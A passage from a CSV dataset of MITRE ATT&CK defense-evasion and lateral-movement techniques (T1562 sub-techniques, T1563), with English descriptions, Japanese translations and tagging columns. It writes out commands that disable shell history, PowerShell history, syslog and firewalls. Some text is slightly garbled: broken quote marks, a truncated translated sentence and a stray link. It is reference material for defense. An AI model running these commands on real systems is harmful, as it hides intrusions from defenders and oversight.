ログを無効化することで、攻撃者は侵害の痕跡を少なく残しながら操作を行うことができます。,defense-evasion,Windows,script_command_execution,stealth,authentication_system;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a,2020-02-21T20:46:36.688Z,2025-04-16T20:37:17.061Z,,,,
T1562.003,T1562,Impair Command History Logging,コマンド履歴の記録を妨害する,"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. The `HISTFILE` environment variable is also used in some ESXi systems.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022) Adversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that  Els Ewill not be saved, but “ls Ewould be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. On Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics) Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).","攻撃者は、侵害されたシステム上で実行したコマンドを隠蔽するため、コマンド履歴の記録を妨害する可能性があります。各種コマンドインタプリタは、ユーザーがターミナルに入力したコマンドを追跡し、ユーザーが実行履歴を遡れるようにしています。 Linux および macOS では、コマンド履歴は環境変数 <code>HISTFILE</code> が指すファイルに記録されます。ユーザーがシステムからログオフすると、この情報はユーザーのホームディレクトリにある <code>~/.bash_history</code> というファイルに書き込まれます。 環境変数<code>HISTCONTROL</code>は、ユーザーがログアウトする際に<code>history</code>コマンドによって保存され、最終的に<code>~/.bash_history</code>ファイルに書き込まれる内容を制御します。macOSではデフォルトで<code>HISTCONTROL</code>は存在しませんが、ユーザーが設定可能であり、その設定は尊重されます。 一部のESXiシステムでは`HISTFILE`環境変数も使用されます（出典: Google Cloud Threat Intelligence ESXi VIBs 2022）。攻撃者はコマンド履歴の記録を妨げるため、履歴環境変数をクリア（`unset HISTFILE`）したり、コマンド履歴サイズをゼロに設定（`export HISTFILESIZE=0`）したりする可能性があります。 さらに、<code>HISTCONTROL</code> を ""ignorespace"" に設定するだけで、先頭にスペースが付いたコマンドを無視するように構成できます。 <code>HISTCONTROL</code> は「ignoredups」に設定することで重複コマンドを無視することも可能です。一部の Linux システムではデフォルトで「ignoreboth」に設定されており、これは前述の 2 つの例を両方カバーします。つまり、 Els E は保存されませんが、「ls E」は履歴に保存されます。 攻撃者は、ターミナルコマンドの先頭にスペースを付けるだけで痕跡を残さずに操作を行う悪用が可能です。Windowsシステムでは、<code>PSReadLine</code>モジュールが全PowerShellセッションで使用されたコマンドを追跡し、ファイル（デフォルトでは<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>）に書き込みます。 攻撃者は<code>Set-PSReadLineOption -HistorySavePath {ファイルパス}</code>を使用してこれらのログ保存先を変更できる。これにより<code>ConsoleHost_history.txt</code>へのログ記録が停止する。さらにPowerShellコマンド<code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>でこのファイルへの記録を無効化することも可能である。(引用元: Microsoft PowerShell Command History)(引用元: Sophos PowerShell command audit)(引用元: Sophos PowerShell Command History Forensics)攻撃者はネットワーク機器上の[ネットワーク機器CLI](https://attack.mitre.org/techniques/T1059/008)を利用して、履歴コマンドのログ記録を無効化することも可能です（例: <code>no logging</code>）。",defense-evasion,Linux;macOS;Windows;Network Devices;ESXi,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59,2020-02-21T20:56:06.498Z,2025-04-15T19:58:50.696Z,,,,
T1562.004,T1562,Disable or Modify System Firewall,システムファイアウォールの無効化または変更,"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel. Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti) Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules. In ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi Firewall)",攻撃者は、ネットワーク使用を制限する制御を回避するために、システムファイアウォールを無効化または変更する場合があります。 変更には、メカニズム全体の無効化、特定のルールの追加・削除・変更が含まれます。これはオペレーティングシステムに応じて、コマンドライン経由、Windowsレジストリキーの編集、Windowsコントロールパネルなど、様々な方法で実行可能です。システムファイアウォールの変更または無効化により、本来許可されない敵対者のC2通信、横方向移動、および/またはデータ流出が可能になる場合があります。 例えば、攻撃者は既知のプロトコル（RDPなど）に対して、非標準かつセキュリティ対策が不十分なポート（例：[非標準ポート](https://attack.mitre.org/techniques/T1571)）を使用する新たなファイアウォールルールを追加する可能性がある。(引用元: change_rdp_conti) 攻撃者はまた、インターフェース帯域幅やネットワーク接続要求のしきい値など、間接的にシステムファイアウォールを操作するホストのネットワーク設定を変更する可能性があります。(引用元: Huntress BlackCat) 様々な[リモートサービス](https://attack.mitre.org/techniques/T1021)の悪用を可能にする設定も、間接的にファイアウォールルールを変更する可能性があります。 ESXiでは、ファイアウォールルールはesxcliコマンドラインインターフェース（例：`esxcli network firewall set`）またはvCenterユーザーインターフェース経由で直接変更可能です。(引用元: Trellix Rnasomhouse 2024)(引用元: Broadcom ESXi Firewall),defense-evasion,Linux;Network Devices;Windows;macOS;ESXi,remote_service_abuse,stealth,user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b,2020-02-21T21:00:48.814Z,2025-04-15T19:58:31.395Z,,,,
T1562.006,T1562,Indicator Blocking,インジケータのブロック,"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). For example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) ETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations. In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors. (Citation: LemonDuck) ESXi also leverages syslog, which can be reconfigured via commands such as `esxcli system syslog config set` and `esxcli system syslog config reload`.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)(Citation: Broadcom Configuring syslog on ESXi)",攻撃者は、センサーによって通常収集されるインジケーターやイベントの収集・分析を妨害しようとする可能性があります。これには、イベントテレメトリの収集と流れを制御する設定を改ざんすることで、悪意を持ってリダイレクトする(引用元: Microsoft Lamin 2017年9月)ことや、イベントトレーシング for Windows (ETW)(引用元: Microsoft About Event Tracing 2018) などのホストベースセンサーを無効化することさえ含まれます。(引用元: Medium Event Tracing Tampering 2018) これらの設定は、構成ファイルやレジストリに保存されるほか、[PowerShell](https://attack.mitre.org/techniques/T1059/001) や [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) などの管理ユーティリティからもアクセス可能です。例えば、攻撃者は<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security</code>内の`File`値を変更し、悪意のある動作を新規または異なる.evtxログファイルに隠蔽することが可能です。この操作はシステム再起動を必要とせず、即時有効となります。(引用元: disable_win_evt_logging) ETWの中断は複数の方法で達成可能ですが、最も直接的な方法は[PowerShell](https://attack.mitre.org/techniques/T1059/001)の<code>Set-EtwTraceProvider</code>コマンドレットで条件を定義するか、レジストリを直接操作して変更を加えることです。 ネットワークベースの指標報告の場合、攻撃者は中央分析を妨げるため、報告に関連するトラフィックをブロックする可能性があります。これには、テレメトリ転送を担当するローカルプロセスの停止や、セキュリティ情報イベント管理（SIEM）製品などイベント集約を担当する特定ホストへのトラフィックをブロックするホストベースのファイアウォールルールの作成など、様々な手段が用いられます。 Linux環境では、攻撃者はsyslogやnxlogなどのログ処理ツールを無効化または再構成し、検知・監視機能を阻害することで、その後の行動を容易にする可能性があります。 (引用元: LemonDuck) ESXiもsyslogを利用しており、`esxcli system syslog config set`や`esxcli system syslog config reload`などのコマンドで再設定可能です。(引用元: Google Cloud Threat Intelligence ESXi VIBs 2022)(引用元: Broadcom Configuring syslog on ESXi),defense-evasion,Windows;macOS;Linux;ESXi,script_command_execution,stealth,authentication_system;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da,2020-03-19T19:09:30.329Z,2025-04-16T21:29:20.899Z,,,,
T1562.007,T1562,Disable or Modify Cloud Firewall,クラウドファイアウォールの無効化または変更,"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).(Citation: Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for [Brute Force](https://attack.mitre.org/techniques/T1110) or [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",攻撃者は、クラウド環境内のファイアウォールを無効化または変更し、クラウドリソースへのアクセスを制限する制御を回避する可能性があります。クラウドファイアウォールは、[システムファイアウォールの無効化または変更](https://attack.mitre.org/techniques/T1562/004)で説明されているシステムファイアウォールとは別物です。 クラウド環境では通常、信頼されたIPアドレスからのネットワーク活動を、想定されたポートおよびプロトコル経由でのみ許可する制限的なセキュリティグループとファイアウォールルールが利用されます。適切な権限を持つ攻撃者は、新たなファイアウォールルールやポリシーを導入し、被害者のクラウド環境へのアクセスを許可したり、クラウド制御プレーンからデータプレーンへ横方向に移動したりすることが可能です。 例えば、攻撃者はスクリプトやユーティリティを使用して既存のセキュリティグループに新たなインバウンドルールを作成（または新規セキュリティグループを完全に作成）し、クラウドホスト型インスタンスへの任意のTCP/IP接続を許可することがあります。(引用元: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) また、悪意のある活動（暗号通貨マイニングなど）に関連するトラフィックをサポートするために、ネットワーク制限を解除することもあります。（引用元：Expel IO Evil in AWS）（引用元：Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022）クラウドファイアウォールの変更または無効化により、本来許可されない敵対者のC2通信、横方向の移動、および／またはデータ流出が可能になる場合があります。 また、[ブルートフォース攻撃](https://attack.mitre.org/techniques/T1110) や [エンドポイントサービス拒否攻撃](https://attack.mitre.org/techniques/T1499) のためのリソースを開放するために使用される可能性もあります。,defense-evasion,IaaS,credential_abuse,stealth,authentication_system;endpoint_execution;network_connectivity;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--77532a55-c283-4cd2-bc5d-2d0b65e9d88c,2020-06-24T16:55:46.243Z,2025-04-15T22:19:38.109Z,,,,
T1562.008,T1562,Disable or Modify Cloud Logs,クラウドログの無効化または変更,"An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality  Efor example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",攻撃者は、自身の活動に関するデータ収集を制限し検知を回避するため、クラウドのログ記録機能や連携機能を無効化または改変する可能性があります。クラウド環境では、ユーザーが環境内で行う活動を把握するための監査ログやアプリケーションログの収集・分析が可能です。攻撃者が十分な権限を有する場合、自身の活動が検知されないようログ記録を無効化または改変できます。例えばAWSでは、攻撃者はさらなる悪意ある活動を行う前にCloudWatch/CloudTrail連携を無効化することがあります。(引用: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) あるいは、関連するSNSトピックの削除、マルチリージョンロギングの無効化、ログファイルの検証および/または暗号化設定の無効化など、ロギング機能自体を改ざんする可能性があります。(引用: AWS Update Trail)(引用: Pacu Detection Disruption Module) Office 365では、攻撃者が`Set-MailboxAuditBypassAssociation`コマンドレットの使用、対象ユーザーのM365高度監査機能無効化、またはユーザーのライセンスをEnterprise E5からEnterprise E3へダウングレードすることで、特定ユーザーのメール収集活動に関するログ記録を無効化する可能性があります。（引用元：Dark Reading Microsoft 365 Attacks 2021）,defense-evasion,IaaS;SaaS;Office Suite;Identity Provider,config_policy_manipulation,stealth,authentication_system;user_interaction;email_infrastructure;cloud_control_plane;saas_in_use;file_storage_access;logging_monitoring,specified,Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d,2020-10-12T13:52:32.846Z,2025-04-15T22:19:53.826Z,,,,
T1562.009,T1562,Safe Mode Boot,セーフモード起動,"Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019) Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021) Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)",攻撃者はWindowsのセーフモードを悪用し、エンドポイント防御機能を無効化することがあります。セーフモードは、限定されたドライバーとサービスのみでWindowsオペレーティングシステムを起動します。エンドポイント検知・対応（EDR）ツールなどのサードパーティ製セキュリティソフトウェアは、セーフモードでWindowsを起動した後、起動しない可能性があります。セーフモードには「セーフモード」と「ネットワーク付きセーフモード」の2種類があります。 セーフモード起動後に追加サービスを起動することは可能です。(引用元: Microsoft Safe Mode)(引用元: Sophos Snatch Ransomware 2019) 攻撃者は、限定的な起動では起動しないエンドポイント防御機能を無効化するためにセーフモードを悪用する可能性があります。ブート構成データ(BCD)ストア（起動アプリケーション設定を管理するファイル）を改変することで、次の再起動後にホストを強制的にセーフモードに誘導できます。(引用元: Microsoft bcdedit 2021) 攻撃者は関連レジストリ値を改変することで、セーフモード起動時に最小限のサービスとして起動するリストに自身の悪意あるアプリケーションを追加することも可能です（例: [レジストリの改変](https://attack.mitre.org/techniques/T1112)）。 悪意のある[Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) オブジェクトも、セーフモードで登録およびロードされる可能性があります。(引用元: Sophos Snatch Ransomware 2019)(引用元: CyberArk Labs Safe Mode 2016)(引用元: Cybereason Nocturnus MedusaLocker 2020)(引用元: BleepingComputer REvil 2021),defense-evasion,Windows,config_policy_manipulation,stealth,network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--28170e17-8384-415c-8486-2e6b294cb803,2021-06-23T20:00:27.600Z,2025-04-25T14:46:08.076Z,,,,
T1562.010,T1562,Downgrade Attack,ダウングレード攻撃,"Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation. Adversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) or [Network Sniffing](https://attack.mitre.org/techniques/T1040).(Citation: Praetorian TLS Downgrade Attack 2014) For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL), which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging) Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.(Citation: Targeted SSL Stripping Attacks Are Real)(Citation: Crowdstrike Downgrade) On Windows systems, adversaries may downgrade the boot manager to a vulnerable version that bypasses Secure Boot, granting the ability to disable various operating system security mechanisms.(Citation: SafeBreach)",攻撃者は、古くなった、脆弱な、および/または更新されたセキュリティ制御をサポートしないシステムの機能をダウングレードまたは使用することがあります。ダウングレード攻撃は通常、システムのバックワード互換性を悪用して、より安全性の低い動作モードに強制的に移行させます。攻撃者は、システムの機能（例：[コマンドおよびスクリプトインタプリタ](https://en.wikipedia.org/wiki/Command_and_Scripting_Interpreter)(https://attack.mitre.org/techniques/T1059)や、[中間者攻撃](https://attack.mitre.org/techniques/T1557)や[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)を可能にする悪用可能なネットワークプロトコルなど、システムの機能の様々なセキュリティレベルの低いバージョンをダウングレードして使用することがあります。(引用: Praetorian TLS ダウングレード攻撃 2014) 例えば、[PowerShell](https://attack.mitre.org/techniques/T1059/001) バージョン 5 以降には、実行されたスクリプトの内容を記録できるスクリプトブロックロギング (SBL) が含まれています。 しかし、攻撃者は、SBL をサポートしていない以前のバージョンの PowerShell を実行して、本来なら検出されるはずの悪意のあるスクリプトを実行しながら、防御機能を損なうことを試みる場合があります。(引用: CrowdStrike BGH Ransomware 2021)(引用: Mandiant BYOL 2018)(引用: att_def_ps_logging) 同様に、攻撃者はネットワークトラフィックを標的にし、暗号化された HTTPS 接続から、ネットワークデータを平文で公開する安全でない HTTP 接続へとダウングレードさせる可能性があります。(引用: Targeted SSL Stripping Attacks Are Real)(引用: Crowdstrike Downgrade) Windowsシステムでは、攻撃者はセキュアブートをバイパスする脆弱なバージョンのブートマネージャにダウングレードし、様々なOSセキュリティ機構を無効化する能力を獲得する。(引用: SafeBreach),defense-evasion,Windows;Linux;macOS,script_command_execution,stealth,endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--824add00-99a1-4b15-9a2d-6c5683b7b497,2021-10-08T14:06:28.212Z,2025-04-15T19:58:46.929Z,,,,
T1562.011,T1562,Spoof Security Alerting,セキュリティアラートの偽装,"Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders Eawareness of malicious activity.(Citation: BlackBasta) Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident. Rather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a “healthy Esystem status even after infection. This can be abused to enable further malicious activity by delaying defender responses. For example, adversaries may show a fake Windows Security GUI and tray icon with a “healthy Esystem status after Windows Defender and other system tools have been disabled.(Citation: BlackBasta)",攻撃者はツールからのセキュリティアラートを偽装し、防御側の悪意ある活動への警戒心を損なう偽の証拠を提示する可能性がある。(引用: BlackBasta) 防御ツールが生成するメッセージには、潜在的なセキュリティイベントに関する情報に加え、セキュリティソフトウェアおよびシステムの稼働状況が含まれる。セキュリティ報告メッセージは、システムの正常な動作を監視し、セキュリティインシデントを示す重要なイベントを特定するために重要である。 攻撃者は、正当なセキュリティツールが無効化された後も（例： [ツールの無効化または改変](https://attack.mitre.org/techniques/T1562/001)）。 攻撃者は感染後も「健全なシステム状態」を提示できる。これにより防御側の対応を遅延させ、さらなる悪意ある活動を可能にする。例：Windows Defenderやシステムツールが無効化された後、偽のWindowsセキュリティGUIやトレイアイコンに「健全なシステム状態」を表示する（出典：BlackBasta）,defense-evasion,Windows;macOS;Linux,defense_disable,stealth,logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--bef8aaee-961d-4359-a308-4c2182bcedff,2023-03-14T16:04:24.865Z,2025-04-15T23:12:05.813Z,,,,
T1562.012,T1562,Disable or Modify Linux Audit System,Linux監査システムの無効化または改変,"Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules. Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`, containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022) With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",攻撃者は悪意のある活動を隠蔽し検知を回避するため、Linux監査システムを無効化または改変する可能性がある。Linux管理者はシステム上のセキュリティ関連情報を追跡するためにLinux監査システムを利用する。Linux監査システムはカーネルレベルで動作し、事前設定されたルールに基づきプロセス、ネットワーク、ファイル、ログインイベントなどのアプリケーションおよびシステム活動に関するイベントログを維持する。 `auditd`としてよく呼ばれるこのデーモンは、イベントをディスクに書き込むために使用され、`audit.conf`設定ファイルで設定されたパラメータによって制御される。ログ生成ルールを設定する主な方法は、コマンドラインユーティリティ`auditctl`と、起動時にロードされる一連の`auditctl`コマンドを含むファイル`/etc/audit/audit.rules`の2つである。(引用: Red Hat System Auditing)(引用: IzyKnows auditd threat detection 2022) 攻撃者はroot権限を用いて、Auditシステムサービスの無効化、設定/ルールファイルの改ざん、またはAuditシステムライブラリ関数のフックにより、自身の活動がログに記録されないようにする可能性があります。 コマンドラインを使用すれば、攻撃者は `auditd` デーモンに関連するプロセスを強制終了することで監査システムサービスを無効化したり、`systemctl` を使用して監査サービスを停止したりできます。 攻撃者は監査システム関数をフックしてログ記録を無効化したり、`/etc/audit/audit.rules` または `audit.conf` ファイル内のルールを改変して悪意のある活動を無視させることも可能です。(引用: Trustwave Honeypot SkidMap 2023)(引用: ESET Ebury Feb 2014),defense-evasion,Linux,script_command_execution,stealth,authentication_system;privileged_account;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--562e9b64-7239-493d-80f4-2bff900d9054,2023-05-24T19:03:03.855Z,2025-04-15T22:20:10.121Z,,,,
T1563,,Remote Service Session Hijacking,リモートサービスセッションハイジャック,"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service. Adversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)",攻撃者は、リモートサービスとの既存セッションを乗っ取り、環境内で横方向に移動することがあります。ユーザーは、telnet、SSH、RDPなど、リモート接続を受け入れるように設計されたサービスに、有効な認証情報を使用してログインすることがあります。ユーザーがサービスにログインすると、そのサービスとの継続的なやり取りを維持できるセッションが確立されます。攻撃者は、これらのセッションを乗っ取り、リモートシステム上で操作を実行することがあります。 [リモートサービスセッションハイジャック](https://attack.mitre.org/techniques/T1563)は、 [リモートサービス](https://attack.mitre.org/techniques/T1021)とは異なり、[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して新規セッションを作成するのではなく、既存のセッションを乗っ取る点で区別されます。（引用元: RDPハイジャック Medium）（引用元: Breach Post-mortem SSHハイジャック）,lateral-movement,Linux;macOS;Windows,credential_abuse,boundary_crossing,authentication_system;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--5b0ad6f8-6a16-4966-a4ef-d09ea6e2a9f5,2020-02-25T18:26:16.994Z,2025-04-15T23:00:02.178Z,,,,
